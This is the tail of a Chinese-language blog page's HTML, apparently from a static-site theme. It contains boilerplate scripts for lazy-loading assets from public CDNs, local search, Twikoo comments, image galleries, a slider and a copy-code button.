  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
